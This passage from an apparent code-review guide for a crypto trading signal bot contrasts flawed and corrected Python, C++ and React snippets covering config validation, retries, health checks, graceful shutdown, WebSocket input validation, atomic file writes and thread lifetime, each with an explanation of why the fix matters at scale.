risk:
  risk_pct: 2        # ← what if someone writes "2%" or "two"?
  max_daily_drawdown: 8
```

```python
# config/__init__.py — no validation
risk_pct = config.get("risk", {}).get("risk_pct", 2)
# ... later in trading loop:
risk_amount = balance * risk_pct / 100
# If risk_pct = "2%" → TypeError: unsupported operand type(s)
# If risk_pct = "2" → works (string * float = error in Python 3)
```

**GOOD**:
```python
from pydantic import BaseModel, validator

class RiskConfig(BaseModel):
    risk_pct: float = 2.0
    max_daily_drawdown: float = 8.0

    @validator("risk_pct")
    def risk_pct_must_be_valid(cls, v):
        if not 0 < v <= 100:
            raise ValueError("risk_pct must be between 0 and 100")
        return v

class Settings(BaseModel):
    risk: RiskConfig
    # ... other sections

# At load time:
config = Settings(**yaml.safe_load(open("settings.yaml")))
# If risk_pct = "2%" → ValidationError: value is not a valid float
# Clear error at startup, not a crash mid-trading
```

**Why it matters at scale:** Without schema validation, a typo in YAML config causes a runtime crash hours or days into operation. `risk_pct: 2%` passes `yaml.safe_load` (it's a valid string), passes config loading (no validation), then crashes on the first trade attempt: `TypeError: unsupported operand type(s) for *: 'float' and 'str'`. The bot has been running for hours, then crashes on the first signal. With 1000 users, that's 1000 bots crashing simultaneously because of a config typo. The good version validates at startup — if the config is wrong, the bot refuses to start with a clear error message. No silent runtime crashes. In a trading system, failing fast at startup is infinitely better than failing mid-trade.

---

### Example 24: Hardcoded Timeouts (No Config Flexibility)

**BAD** — `real_exchange_client.py:94`:
```python
self._session = aiohttp.ClientSession(
    timeout=aiohttp.ClientTimeout(total=10)  # ← hardcoded
)
```

**GOOD**:
```python
# config/settings.yaml
network:
  ws_timeout: 30
  http_timeout: 10
  db_timeout: 30
  reconnect_delay: 5
  max_reconnects: 10

# real_exchange_client.py
self._session = aiohttp.ClientSession(
    timeout=aiohttp.ClientTimeout(total=config.network.http_timeout)
)
```

**Why it matters at scale:** A hardcoded 10s timeout might be fine for Binance (fast API), but too short for a slow exchange in Asia (200ms RTT + processing). When a user in Singapore connects to a US exchange, 10s might not be enough for heavy order book snapshots. To change the timeout, you need to: edit source code → commit → CI → build Docker image → deploy. That's 30+ minutes of downtime for a 1-number change. The good version puts timeouts in config — change YAML, restart pod, done in 30 seconds. With 1000 users across different regions, each needing different timeouts, hardcoded values are unworkable. Config-driven timeouts let each deployment tune to its network conditions without code changes.

---

### Example 25: Missing Tests on Critical Paths

**BAD** — `ai-signal-bot/tests/`:
```
tests/
├── unit/
│   ├── test_strategies.py      ✅
│   ├── test_risk_manager.py    ✅
│   ├── test_backtester.py      ✅
│   ├── test_signal_validator.py ✅
│   └── ...
└── integration/
    └── test_e2e_pipeline.py    ✅

# But these critical modules have ZERO tests:
# - signal_publisher.py  (WS broadcast to clients)
# - db.py                (SQLite CRUD, WAL checkpoint)
# - alerting.py          (Discord/Telegram/webhook alerts)
# - ws_client.py         (reconnection logic)
# - notifier.py          (notification dispatch)
```

**GOOD**:
```python
# tests/unit/test_signal_publisher.py
import pytest
from unittest.mock import AsyncMock, MagicMock
from src.communication.signal_publisher import SignalPublisher

class TestSignalPublisher:
    @pytest.mark.asyncio
    async def test_broadcast_to_multiple_clients(self):
        pub = SignalPublisher(...)
        client1 = AsyncMock(); client2 = AsyncMock()
        pub._clients = {client1, client2}
        await pub.broadcast_signal({"symbol": "BTC/USDT", "direction": "LONG"})
        client1.send.assert_called_once()
        client2.send.assert_called_once()

    @pytest.mark.asyncio
    async def test_slow_client_disconnected(self):
        pub = SignalPublisher(...)
        slow_client = AsyncMock()
        slow_client.send.side_effect = asyncio.TimeoutError
        pub._clients = {slow_client}
        await pub.broadcast_signal({"symbol": "BTC/USDT"})
        assert slow_client not in pub._clients  # removed

# tests/unit/test_db.py
class TestDatabase:
    def test_insert_and_retrieve_signal(self):
        db = Database(":memory:")
        db.save_signal({"symbol": "BTC/USDT", "direction": "LONG"})
        signals = db.get_recent_signals(limit=1)
        assert len(signals) == 1
        assert signals[0]["symbol"] == "BTC/USDT"
```

**Why it matters at scale:** Signal publisher, DB, and alerting are the backbone of the trading system. A bug in `broadcast_signal` means clients get stale or no data. A bug in `db.py` means trades are lost. A bug in `alerting.py` means critical alerts don't fire. Without tests, these bugs ship to production and are discovered by users. With 1000 users, a signal publisher bug affects all 1000 simultaneously. The good version tests the actual critical paths: broadcast to N clients, slow client removal, DB insert/retrieve, alert dispatch. Each test runs in <1s and catches regressions before they reach production. The cost of writing these tests is 2 hours. The cost of a production bug in signal publishing is 1000 users losing money.

---

### Example 26: Dead Code (Unused Module)

**BAD** — `ai-signal-bot/src/observability/tracing.py` (111 lines):
```python
# Fully implemented OpenTelemetry tracing...
def setup_tracing(service_name, endpoint, enabled=True):
    # 30 lines of OTel setup
    ...

def get_tracer(name):
    # 20 lines of no-op fallback
    ...

def shutdown_tracing():
    # 15 lines of graceful shutdown
    ...

# But grep for setup_tracing|get_tracer across entire project = 0 matches
# Nobody calls this. Nobody imports this. 111 lines of dead code.
```

**GOOD**:
```python
# Option A: Integrate it
# run.py
from src.observability.tracing import setup_tracing, shutdown_tracing

setup_tracing(service_name="ai-signal-bot", endpoint=config.tracing.endpoint)
# ... at shutdown:
shutdown_tracing()

# Option B: Remove it
# git rm src/observability/tracing.py
# Less code = less maintenance, fewer dependencies, smaller image
```

**Why it matters at scale:** Dead code is a liability, not an asset. It looks maintained (has docstrings, proper error handling), so developers assume it's used. They waste time reading it, understanding it, updating its dependencies. When someone finally tries to use it, it's broken — because nobody tested it, the API drifted from what callers would need. In a codebase with 1000 files, 10% dead code means 100 files of confusion. New developers spend hours reading code that does nothing. In the worst case, dead code has security vulnerabilities (outdated dependencies) that show up in audits but can't be exploited because the code is never called — but you still have to fix them. The good version is binary: either integrate it (add the 2-line call in `run.py`) or delete it. No zombie code.

---

### Example 27: No Graceful Shutdown (Data Loss on Termination)

**BAD** — `run.py`:
```python
async def main():
    bot = SignalBot(config)
    await bot.start()  # runs forever

if __name__ == "__main__":
    asyncio.run(main())
# Ctrl+C or docker stop → SIGTERM → process killed immediately
# DB connection: not closed (WAL checkpoint not run)
# WS clients: not notified (they hang until TCP timeout)
# In-flight orders: lost (sent to exchange, not recorded in DB)
# aiohttp sessions: not closed (socket leaks until OS GC)
```

**GOOD**:
```python
import signal

async def main():
    bot = SignalBot(config)
    db = Database(config.db.path)
    publisher = SignalPublisher(...)

    shutdown_event = asyncio.Event()

    loop = asyncio.get_event_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, shutdown_event.set)

    # Run bot and wait for shutdown signal
    bot_task = asyncio.create_task(bot.start())
    await shutdown_event.wait()

    # Graceful shutdown
    logger.info("Shutting down...")
    bot_task.cancel()
    await publisher.notify_shutdown()  # tell WS clients
    await db.close()                    # WAL checkpoint, close conn
    await bot.http_session.close()      # close aiohttp
    logger.info("Shutdown complete")

if __name__ == "__main__":
    asyncio.run(main())
```

**Why it matters at scale:** Without graceful shutdown, every `docker stop` or `Ctrl+C` is a potential data loss event. The bot sent an order to Binance, but before the DB `INSERT` into `trades` table ran, the process was killed. The order is live on the exchange, but not tracked locally. Position tracking is wrong. Risk management is wrong. P&L is wrong. With 1000 users, every deploy (which triggers `docker stop`) risks 1000 data loss events. The good version catches SIGTERM/SIGINT, cancels the bot task, notifies WS clients, closes the DB (running WAL checkpoint to persist all writes), and closes HTTP sessions. No data loss, no socket leaks, no orphaned orders. In K8s, this is even more critical — pods are terminated regularly (scaling, updates, node draining). Without graceful shutdown, every pod termination is a potential incident.

---

### Example 28: No WebSocket Keepalive (Silent Disconnects)

**BAD** — `signal_publisher.py`:
```python
self._server = await websockets.serve(
    self._handle_client, host, port
)
# ← no ping_interval, no ping_timeout
# Client connects, then network goes down (WiFi off, VPN drop)
# Server still thinks client is connected
# Client still thinks it's connected
# No data flows, but no error either
# After 60s, firewall drops the dead TCP connection
# But server doesn't know until it tries to send → exception
```

**GOOD**:
```python
self._server = await websockets.serve(
    self._handle_client, host, port,
    ping_interval=20,   # send ping every 20s
    ping_timeout=10,    # wait 10s for pong, else disconnect
    close_timeout=5,    # graceful close timeout
)
# Server pings every 20s. If no pong in 10s, server disconnects client.
# Client knows within 30s that connection is dead → reconnect.
# No silent disconnects, no stale connections in _clients set.
```

**Why it matters at scale:** Without keepalive, dead connections accumulate in the `_clients` set. The server tries to broadcast to 100 clients, but 30 are dead (WiFi dropped, laptop closed, VPN failed). Each `send()` to a dead client hangs until TCP timeout (30-120s). The broadcast to the 70 alive clients is blocked waiting for the 30 dead ones. With 1000 users, 300 dead connections means every signal broadcast takes 2+ minutes instead of 100ms. The good version sends ping every 20s — dead clients are detected and removed within 30s. The broadcast only hits alive clients. In a trading system where signal latency matters (60s interval), a 2-minute broadcast delay means signals arrive after the next candle already started. Keepalive is not optional — it's the difference between a responsive system and a zombie-filled one.

---

### Example 29: No Retry on Transient Failures (Exchange 429, DB Locked)

**BAD** — `real_exchange_client.py`:
```python
async def fetch_candles(self, symbol: str) -> list[dict]:
    return await self._exchange.fetch_ohlcv(symbol, "1m", limit=100)
    # If Binance returns 429 (rate limited) → exception → signal generation fails
    # If SQLite returns "database is locked" → exception → trade not saved
    # If LLM API returns 503 → exception → no analysis
    # All transient errors treated as permanent failures
```

**GOOD**:
```python
from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type

@retry(
    stop=stop_after_attempt(3),
    wait=wait_exponential(min=1, max=10),
    retry=retry_if_exception_type((aiohttp.ClientError, asyncio.TimeoutError)),
    reraise=True,
)
async def fetch_candles(self, symbol: str) -> list[dict]:
    return await self._exchange.fetch_ohlcv(symbol, "1m", limit=100)

# For DB:
@retry(
    stop=stop_after_attempt(3),
    wait=wait_exponential(min=0.1, max=2),
    retry=retry_if_exception_type(sqlite3.OperationalError),
    reraise=True,
)
def save_trade(self, trade: dict) -> None:
    with self._get_conn() as conn:
        conn.execute("INSERT INTO trades ...", ...)
```

**Why it matters at scale:** Exchanges rate-limit. Binance returns 429 when you exceed 1200 requests/min. Without retry, a single 429 kills the signal generation for that cycle. The bot misses a trading opportunity because of a transient rate limit. SQLite returns "database is locked" when another process is writing. Without retry, the trade is lost — it was sent to the exchange but never recorded in the DB. With 1000 users each making 10 API calls/min, 429s happen regularly. The good version retries 3 times with exponential backoff (1s, 2s, 4s). If Binance rate-limits, the bot waits 1s and tries again — usually succeeds. If DB is locked, it waits 100ms and tries again — the other writer is done. The circuit breaker still protects against persistent failures (5 consecutive → open), but transient blips are handled gracefully. The cost is 2 lines of decorator. The benefit is eliminating 90% of transient-failure data loss.

---

### Example 30: Shallow Health Check (HTTP 200 ≠ Actually Healthy)

**BAD** — `health_check.py`:
```python
async def _check_service(self, name: str, url: str) -> dict:
    async with session.get(url) as resp:
        if resp.status == 200:
            return {"status": "healthy"}  # ← but is it really?
```

```python
# Bot's own /health endpoint:
async def handle_health(request):
    return web.json_response({"status": "ok"})  # ← always returns ok
    # Doesn't check: DB writable? Exchange connected? Queue backed up?
```

**GOOD**:
```python
# Bot's own /health endpoint with depth:
async def handle_health(request):
    checks = {}

    # DB check
    try:
        db.execute("SELECT 1")
        checks["db"] = "ok"
    except Exception as e:
        checks["db"] = f"error: {e}"

    # Exchange check
    if time.time() - last_candle_time > 60:
        checks["exchange"] = "stale (no candles in 60s)"
    else:
        checks["exchange"] = "ok"

    # Queue depth
    if signal_queue.qsize() > 100:
        checks["queue"] = f"backlogged ({signal_queue.qsize()})"
    else:
        checks["queue"] = "ok"

    all_ok = all(v == "ok" for v in checks.values())
    return web.json_response(
        {"status": "healthy" if all_ok else "degraded", "checks": checks},
        status=200 if all_ok else 503,
    )
```

**Why it matters at scale:** A shallow health check returns 200 even when the bot can't trade. The DB is locked, the exchange disconnected, the queue is backed up with 500 pending signals — but `/health` says "ok". Kubernetes keeps the pod running because the health check passes. Users get stale signals, missing trades, wrong positions. With 1000 users, 1000 bots are "healthy" but none can actually trade. The good version checks actual dependencies: can I write to DB? Am I receiving candles? Is my queue manageable? If any check fails, the health endpoint returns 503, and Kubernetes restarts the pod. The bot self-heals instead of running in a zombie state. In a trading system, a "healthy" bot that can't trade is worse than a crashed bot — at least a crashed bot gets restarted.

---

### Example 31: SHM Not Cleaned Up on Crash (Stale Segment)

**BAD** — `shm_signal_producer.py`:
```python
class ShmSignalProducer:
    def init(self) -> bool:
        self._buffer = ShmRingBuffer(
            name=self.name,
            create=True,  # ← creates SHM segment
        )
        return True

    def close(self):
        if self._buffer:
            self._buffer.unlink()  # ← only called on graceful close
            self._buffer = None

# If process crashes (SIGKILL, OOM, segfault):
# → close() never called
# → SHM segment "/hft_signals" still exists in /dev/shm
# → On restart: ShmRingBuffer(create=True) → FileExistsError
# → Bot can't start. Manual fix: ipcrm -M /hft_signals
```

**GOOD**:
```python
import atexit
import signal

class ShmSignalProducer:
    def init(self) -> bool:
        # Try to unlink stale segment first (from previous crash)
        try:
            ShmRingBuffer(name=self.name, create=False).unlink()
        except FileNotFoundError:
            pass  # no stale segment, clean start

        self._buffer = ShmRingBuffer(
            name=self.name,
            create=True,
        )
        atexit.register(self.close)  # cleanup on normal exit
        signal.signal(signal.SIGTERM, self._signal_handler)  # cleanup on SIGTERM
        return True

    def _signal_handler(self, signum, frame):
        self.close()
        raise SystemExit(0)
```

**Why it matters at scale:** SHM segments persist in `/dev/shm` until explicitly unlinked or the system reboots. If the bot crashes (OOM, segfault, SIGKILL), the segment stays. On restart, `create=True` fails with `FileExistsError`. The bot is stuck — it can't start because of a leftover from a previous crash. With 1000 users on shared infrastructure, each crash leaves a stale segment. After 100 crashes, `/dev/shm` is full of zombie segments, and no new bot can start. The good version tries to unlink any stale segment first, then creates a fresh one. It also registers `atexit` and signal handlers for cleanup. In production, this is the difference between "bot restarts after crash" and "bot can't start, manual intervention required". The cost is 5 lines. The benefit is automatic recovery from any crash.

---

### Example 32: asyncio Race Condition (Set Changed During Iteration)

**BAD** — `signal_publisher.py`:
```python
class SignalPublisher:
    def __init__(self):
        self._clients: set = set()

    async def _handle_client(self, ws):
        self._clients.add(ws)           # ← coroutine A: adds
        try:
            await ws.wait_closed()
        finally:
            self._clients.discard(ws)   # ← coroutine A: removes

    async def broadcast_signal(self, msg):
        for ws in self._clients:        # ← coroutine B: iterates
            await ws.send(msg)          # ← yields control here
            # While awaiting, coroutine A runs:
            # → self._clients.discard(ws) or self._clients.add(new_ws)
            # → RuntimeError: Set changed size during iteration
```

**GOOD**:
```python
class SignalPublisher:
    def __init__(self):
        self._clients: set = set()
        self._clients_lock = asyncio.Lock()

    async def _handle_client(self, ws):
        async with self._clients_lock:
            self._clients.add(ws)
        try:
            await ws.wait_closed()
        finally:
            async with self._clients_lock:
                self._clients.discard(ws)

    async def broadcast_signal(self, msg):
        # Snapshot the set under lock, then iterate the copy
        async with self._clients_lock:
            clients = list(self._clients)
        # Now iterate the copy — mutations to _clients don't affect us
        results = await asyncio.gather(
            *[ws.send(msg) for ws in clients],
            return_exceptions=True,
        )
```

**Why it matters at scale:** asyncio is single-threaded, but `await` is a yield point. Between `for ws in self._clients` and `await ws.send(msg)`, any other coroutine can run. If a client disconnects during broadcast, `_handle_client`'s `finally` block runs `self._clients.discard(ws)` — modifying the set while `broadcast_signal` is iterating it. Python raises `RuntimeError: Set changed size during iteration`. The broadcast crashes, no client gets the signal. With 1000 users, each having 5-10 WS clients, disconnects happen constantly. The broadcast crashes on every other signal. The good version takes a snapshot of the set under a lock, then iterates the copy. Mutations to `_clients` don't affect the broadcast. The lock ensures the snapshot is consistent. In a trading system, a crashed broadcast means 1000 users miss a signal — potentially a profitable trade. The fix is 3 lines. The cost of not fixing is every signal broadcast being a coin flip.

---

### Example 33: No WS Input Validation (Trust Client Data)

**BAD** — `signal_publisher.py:141`:
```python
async for message in websocket:
    data = json.loads(message)       # ← accepts any JSON
    msg_type = data.get("type")      # ← could be None
    if msg_type == "run_backtest":
        result = await self._run_backtest(data)
        # _run_backtest does:
        # backtests = data.get("backtests", [])
        # if len(backtests) < 2: ...
        # What if backtests = "hello"? len("hello") = 5 >= 2
        # → iterates characters 'h','e','l','l','o' → crash
        # What if data = [1,2,3]? data.get("type") → AttributeError
        # What if message = 50MB JSON? → OOM
```

**GOOD**:
```python
from pydantic import BaseModel, ValidationError
from typing import Literal

class SubscribeMsg(BaseModel):
    type: Literal["subscribe"]
    client: str = "unknown"

class BacktestMsg(BaseModel):
    type: Literal["run_backtest"]
    strategy: str
    candles: int = 100
    symbol: str = "BTC/USDT"

async for message in websocket:
    try:
        raw = json.loads(message)
        if not isinstance(raw, dict):
            await websocket.send(json.dumps({"error": "expected object"}))
            continue

        msg_type = raw.get("type")
        if msg_type == "subscribe":
            msg = SubscribeMsg(**raw)
            logger.info(f"Client subscribed: {msg.client}")
        elif msg_type == "run_backtest":
            msg = BacktestMsg(**raw)
            result = await self._run_backtest(msg.model_dump())
            await websocket.send(json.dumps(result))
    except ValidationError as e:
        await websocket.send(json.dumps({"error": str(e)}))
    except json.JSONDecodeError:
        await websocket.send(json.dumps({"error": "invalid JSON"}))
```

**Why it matters at scale:** Without validation, any client can crash the bot. Send `{"type": "run_backtest", "backtests": "not_a_list"}` — `len("not_a_list")` returns 10, which passes the `>= 2` check, then iteration produces characters, and the bot crashes on `char.get("strategy")`. Send a 100MB JSON — bot runs out of memory parsing it. Send `[1,2,3]` — `list.get("type")` raises `AttributeError`, unhandled, bot crashes. With 1000 users, one buggy or malicious client takes down the entire signal broadcasting service for everyone. The good version validates every incoming message with a Pydantic schema. Wrong type? Send error, continue. Invalid JSON? Send error, continue. Too large? Reject before parsing. The bot stays up no matter what clients send. In a trading system, one client crashing the signal server means 999 other users lose their signals — potentially missing profitable trades. Input validation is not optional, it's self-defense.

---

### Example 34: No DB Migration Runner (Schema Drift)

**BAD** — `src/database/`:
```
migrations/
├── 001_initial_schema.sql    ← exists, never applied by code
├── 002_add_candle_partitions.sql
├── 003_add_risk_events.sql
└── 004_add_backtests.sql

db.py:
def _init_schema(self):
    conn.execute("CREATE TABLE IF NOT EXISTS signals ...")  # ← separate schema
    conn.execute("CREATE TABLE IF NOT EXISTS trades ...")    # ← diverges from SQL files
```

**GOOD**:
```python
# migrate.py
import sqlite3
import os

MIGRATIONS_DIR = os.path.join(os.path.dirname(__file__), "migrations")

def apply_migrations(db_path: str) -> None:
    conn = sqlite3.connect(db_path)
    conn.execute("CREATE TABLE IF NOT EXISTS _migrations (id INTEGER PRIMARY KEY, name TEXT, applied_at REAL)")
    applied = {row[0] for row in conn.execute("SELECT name FROM _migrations")}

    for filename in sorted(os.listdir(MIGRATIONS_DIR)):
        if filename.endswith(".sql") and filename not in applied:
            with open(os.path.join(MIGRATIONS_DIR, filename)) as f:
                conn.executescript(f.read())
            conn.execute("INSERT INTO _migrations (name, applied_at) VALUES (?, ?)",
                        (filename, time.time()))
            conn.commit()
            logger.info(f"Applied migration: {filename}")

# In run.py startup:
apply_migrations(config.db.path)
```

**Why it matters at scale:** Without a migration runner, schema changes are manual. Someone adds a column to `003_add_risk_events.sql`, but nobody runs it. The code expects the column, the DB doesn't have it → `sqlite3.OperationalError: table signals has no column named risk_score`. With 1000 users, each deployment requires manually running 4 SQL files on each user's DB. That's 4000 manual SQL executions. Someone will forget. Someone will run them in the wrong order. Someone will run them twice (idempotency issues). The SQLite `db.py` schema and the PostgreSQL migration files diverge — `db.py` has `CREATE TABLE IF NOT EXISTS` with different columns than `001_initial_schema.sql`. Which one is the source of truth? Nobody knows. The good version has a migration runner that: reads SQL files in order, tracks applied versions in a `_migrations` table, skips already-applied migrations, and runs automatically on startup. No manual SQL, no drift, no "works on my machine" schema issues. In a trading system, schema drift means the bot crashes on startup because `SELECT risk_score FROM signals` fails — the column doesn't exist. 1000 users can't start their bots because of a missing column that was supposed to be added 3 months ago.

---

### Example 35: No Top-Level ErrorBoundary (White Screen on Crash)

**BAD** — `App.jsx`:
```jsx
import PanelErrorBoundary from './components/PanelErrorBoundary'

function App() {
  return (
    <div className="app">
      <StatusBar data={data} />        // ← no ErrorBoundary
      <KeyboardHelp />                  // ← no ErrorBoundary
      <PanelErrorBoundary panelName="Tab Content">
        <TabContent />                  // ← protected
      </PanelErrorBoundary>
    </div>
  )
}

// If StatusBar throws (e.g., data is undefined):
// → No ErrorBoundary above it
// → React unmounts the entire tree
// → User sees blank white page
// → No error message, no retry button, no recovery
// → Must refresh the page, losing all state
```

**GOOD**:
```jsx
import PanelErrorBoundary from './components/PanelErrorBoundary'

function App() {
  return (
    <PanelErrorBoundary panelName="App">
      <div className="app">
        <StatusBar data={data} />
        <KeyboardHelp />
        <PanelErrorBoundary panelName="Tab Content">
          <TabContent />
        </PanelErrorBoundary>
      </div>
    </PanelErrorBoundary>
  )
}

// If StatusBar throws:
// → Top-level ErrorBoundary catches it
// → Shows error message with retry button
// → User clicks retry → app re-renders
// → State preserved (zustand store survives)
// → No white screen, no data loss
```

**Why it matters at scale:** React error boundaries are like try/catch for components. Without a top-level boundary, any uncaught error in any component unmounts the entire React tree. The user sees a blank white page. No error message, no retry, no recovery. They must refresh the page, losing all state (open positions, chart data, WS connections). With 1000 users, any minor bug in any component — a null reference in `StatusBar`, a missing prop in `KeyboardHelp`, a bad date format in a chart — white-screens the entire dashboard for everyone. The good version wraps the entire app in a top-level ErrorBoundary. If any component throws, the boundary shows an error message with a retry button. The user clicks retry, the app re-renders, state is preserved. The cost is 2 lines of JSX. The benefit is the app never white-screens — it always shows something useful, even when things break. In a trading dashboard, a white screen means users can't see their positions, can't close trades, can't monitor risk. That's not a UI bug, that's a financial risk.

---

### Example 36: Non-Atomic File Write (Corruption on Crash)

**BAD** — `fix_session.h:262`:
```cpp
void save_seq_nums() {
    std::lock_guard<std::mutex> lk(seq_mutex_);
    std::ofstream f(seq_file_path_);    // ← opens file (truncates to 0)
    if (f) {
        f << outgoing_seq_.load() << ' '
          << incoming_seq_.load();       // ← writes to file
    }
    // ← file closes (flushes to disk)
}

// If process crashes between open and write:
// → File exists but is empty (truncated)
// → On restart: load_seq_nums() reads empty file
// → out_seq = 1, in_seq = 1 (defaults)
// → Exchange rejects all messages (seq too low)
// → FIX session broken, must manually reset on exchange side
```

**GOOD**:
```cpp
void save_seq_nums() {
    std::lock_guard<std::mutex> lk(seq_mutex_);
    std::string tmp_path = seq_file_path_ + ".tmp";
    {
        std::ofstream f(tmp_path);       // ← write to temp file
        if (!f) return;
        f << outgoing_seq_.load(std::memory_order_relaxed) << ' '
          << incoming_seq_.load(std::memory_order_relaxed);
        f.flush();
    }
    // Atomic rename — old file is intact until rename succeeds
    std::filesystem::rename(tmp_path, seq_file_path_);
}

// If process crashes during write:
// → Temp file is incomplete, original file is intact
// → On restart: load_seq_nums() reads original file
// → Correct seq nums loaded, FIX session continues
// → No manual reset needed
```

**Why it matters at scale:** Writing to a file in-place is not atomic. `std::ofstream` opens the file (truncating it to 0 bytes), then writes data, then closes (flushes). If the process crashes between truncate and flush, the file is empty. For FIX protocol sequence numbers, this is catastrophic. The exchange expects message sequence numbers to be monotonically increasing. If the bot restarts with seq=1 after sending seq=500, the exchange rejects all messages with "seq too low". The FIX session is broken. Someone must call the exchange admin to reset the sequence numbers manually. With 1000 users, that's 1000 support tickets. The good version writes to a temp file first, then atomically renames it to the target path. `rename()` is atomic on POSIX — the target file is either the old version or the new version, never empty. If the process crashes during the write, the temp file is incomplete but the original file is intact. On restart, the correct sequence numbers are loaded. The FIX session continues without intervention. The cost is 3 lines. The benefit is crash-proof persistence. In a trading system, a broken FIX session means the bot can't send orders — it's effectively down. Atomic writes are the difference between "bot restarts and continues trading" and "bot restarts but can't trade until someone calls the exchange".

---

### Example 37: Health Checks Implemented But Not Wired (Dead Code)

**BAD** — `health_checks.py` exists but `run.py` doesn't use it:
```python
# health_checks.py — 221 lines of excellent code
class HealthChecker:
    async def check_liveness(self) -> dict:
        return {"status": "alive", "uptime_seconds": uptime, "pid": pid}

    async def check_readiness(self) -> dict:
        components = []
        components.append(await self._check_ws())      # WebSocket
        components.append(await self._check_db())      # TimescaleDB
        components.append(await self._check_redis())   # Redis
        components.append(await self._check_exchange()) # Exchange
        # Returns HTTP 503 if unhealthy → K8s removes pod from service
        ...

def create_health_endpoints(checker: HealthChecker):
    # Returns aiohttp handlers for /health/live, /health/ready, /health/status
    ...

# run.py — uses the SHALLOW health check instead
from communication.health_check import HealthCheckServer
# HealthCheckServer just returns {"status": "ok"} — no dependency checks
# The 221-line HealthChecker is never imported, never used
```

**GOOD**:
```python
# run.py — wire the deep health checker
from observability.health_checks import HealthChecker, create_health_endpoints

async def main():
    # ... start WS client, DB, Redis, exchange ...

    health_checker = HealthChecker(
        ws_client=ws_client,
        db_client=db_client,
        redis_client=redis_client,
        exchange=exchange,
    )

    live_handler, ready_handler, status_handler = create_health_endpoints(health_checker)

    # Register on the existing aiohttp app
    app = web.Application()
    app.router.add_get("/health/live", live_handler)
    app.router.add_get("/health/ready", ready_handler)    # K8s readinessProbe
    app.router.add_get("/health/status", status_handler)

    # K8s will now:
    #   livenessProbe → /health/live → 200 (process alive)
    #   readinessProbe → /health/ready → 200 (deps connected) or 503 (deps down)
    # If DB is down → /health/ready returns 503 → K8s removes pod from service
    #   → no traffic sent to broken pod → users don't see errors
```

**Why it matters at scale:** Writing health checks and not wiring them is worse than not writing them at all. It creates a false sense of security — "we have deep health checks" — but the running system uses a shallow `{"status": "ok"}` that returns 200 even when the database is down, Redis is unreachable, and the WebSocket is disconnected. K8s sends traffic to a broken pod because the readiness probe always returns 200. Users see errors, timeouts, and failed trades. The 221 lines of `HealthChecker` code are dead weight — they take effort to maintain but provide zero value. The good version wires the `HealthChecker` into `run.py`, passes the actual WS/DB/Redis clients, and registers the handlers on the HTTP server. Now K8s can make intelligent routing decisions: if the DB is down, the readiness probe returns 503, K8s removes the pod from the service, and users are routed to a healthy pod instead. The cost is 10 lines in `run.py`. The benefit is K8s actually knows when the pod is healthy. In a trading system with 1000 users, a broken pod that stays in rotation means every user routed to that pod gets errors. With proper health checks, K8s removes the broken pod in seconds — users never see the problem.

---

### Example 38: Source File Missing, Only Bytecode Exists

**BAD**:
```python
# ai-signal-bot/src/networking/__pycache__/dpdk_transport.cpython-312.pyc
# ↑ This is the ONLY trace of dpdk_transport.py
# The .py source file is missing — deleted, never committed, or lost

# Somewhere in the codebase:
from networking.dpdk_transport import DPDKTransport
# ↑ This import works on the machine with the .pyc
# ↓ This import fails on any other machine, CI, Docker build, or after git clean

# Problems:
# 1. Can't lint the code (ruff needs .py, not .pyc)
# 2. Can't audit the code (can't read bytecode)
# 3. Can't modify the code (no source to edit)
# 4. .pyc is Python-version-specific (cpython-312 won't work on 3.11)
# 5. git clean → .pyc deleted → module gone → import fails → bot crashes
# 6. New developer clones repo → no .pyc (gitignored) → import fails
# 7. CI/CD builds Docker image → no .pyc → import fails → tests fail
```

**GOOD**:
```python
# Option A: Restore the source file
# git log --all --diff-filter=D -- networking/dpdk_transport.py
# git checkout <commit>^ -- networking/dpdk_transport.py

# Option B: If source is truly lost, remove all references
# grep -r "dpdk_transport" --include="*.py"
# Remove all imports and usages
# Delete the __pycache__ entry

# Option C: If DPDK is not needed, remove the entire networking module
# rm -rf networking/
# Remove from __init__.py exports
```

**Why it matters at scale:** A source file that exists only as bytecode is a ticking bomb. It works on one machine, on one Python version, until someone runs `git clean` or clears `__pycache__`. Then the import fails and the bot crashes on startup. With 1000 users, any new deployment to a fresh machine (Docker build, CI/CD, new developer setup) will fail because the `.pyc` is not in git (it's gitignored). The module is effectively dead code that can't be maintained, audited, or modified. In a trading system, this means the bot can't start on any new machine. The fix is simple: either restore the source from git history, or remove all references to the module. The worst option is to do nothing — the module works "by accident" on one machine and fails everywhere else. This is how "works on my machine" bugs happen. The cost is 5 minutes of git archaeology. The benefit is the codebase is self-consistent and deployable anywhere.

---

### Example 39: Detached Thread Capturing `this` (Use-After-Free)

**BAD** — `order_executor.h:57`:
```cpp
class OrderExecutor {
    std::atomic<bool> should_reconnect_{false};
    std::thread ws_thread_;

    void do_connect() {
        // ... setup WebSocket ...
        client_->set_close_handler([this](websocketpp::connection_hdl) {
            if (should_reconnect_) {
                int delay = reconnect_delay_.load();
                std::thread([this, delay]() {
                    std::this_thread::sleep_for(
                        std::chrono::milliseconds(delay));
                    if (should_reconnect_) {
                        if (ws_thread_.joinable()) ws_thread_.join();
                        do_connect();  // ← captures `this`
                    }
                }).detach();  // ← detached, can't join
            }
        });
    }

    void disconnect() {
        should_reconnect_ = false;
        // ... close WebSocket ...
    }
    // No destructor joins the detached thread
};

// Scenario:
// 1. Connection drops → close handler fires
// 2. Detached thread starts, sleeps 30s (backoff)
// 3. User calls disconnect() → should_reconnect_ = false
// 4. OrderExecutor goes out of scope → destructor runs → object freed
// 5. Thread wakes up after 30s
// 6. Reads should_reconnect_ → freed memory → UB
// 7. If it reads `false` → lucky, no crash
// 8. If it reads `true` (stale value) → calls do_connect() on freed object
//    → heap corruption, segfault, or silent data corruption
```

**GOOD**:
```cpp
class OrderExecutor {
    std::atomic<bool> should_reconnect_{false};
    std::thread reconnect_thread_;
    std::thread ws_thread_;

    void do_connect() {
        client_->set_close_handler([this](websocketpp::connection_hdl) {
            if (should_reconnect_) {
                int delay = reconnect_delay_.load();
                if (reconnect_thread_.joinable()) reconnect_thread_.join();
                reconnect_thread_ = std::thread([this, delay]() {
                    std::this_thread::sleep_for(
                        std::chrono::milliseconds(delay));
                    if (should_reconnect_) {
                        if (ws_thread_.joinable()) ws_thread_.join();
                        do_connect();
                    }
                });
                // NOT detached — stored as member, joined in destructor
            }
        });
    }

    void disconnect() {
        should_reconnect_ = false;
        if (connected_) client_->close(...);
        if (reconnect_thread_.joinable()) reconnect_thread_.join();
        if (ws_thread_.joinable()) ws_thread_.join();
